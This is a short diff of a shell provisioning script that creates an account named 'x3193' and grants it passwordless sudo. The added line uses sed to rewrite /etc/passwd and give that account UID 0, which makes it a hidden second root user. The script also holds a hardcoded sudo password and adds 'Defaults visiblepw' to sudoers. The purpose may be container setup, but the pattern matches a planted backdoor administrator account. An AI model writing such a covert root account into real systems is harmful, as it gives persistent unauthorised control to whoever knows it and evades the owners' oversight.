@@ -10,12 +10,14 @@ export INPUTRC=/etc/inputrc
 #cp -R -f /var/www/html/shell/cloud/opsv3/conf/inputrc-rh /etc/inputrc
 #1001
 adduser --shell /bin/bash --system --ingroup root --force-badname --uid 1001 x3193
+sed -i "s/x3193:x:1001:0::/x3193:x:0:0:x3193:/g" /etc/passwd
 echo "x3193 ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 if [ $1 = "start" ] ; then
 	echo "Defaults visiblepw" >> /etc/sudoers
 fi
 usermod -a -G sudo x3193
 usermod -a -G adm x3193
+
 echo "sudopsw" | sudo -S echo "x3193:${ROOT_PASS}" | sudo chpasswd
 #ssh
 echo "${uid} ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
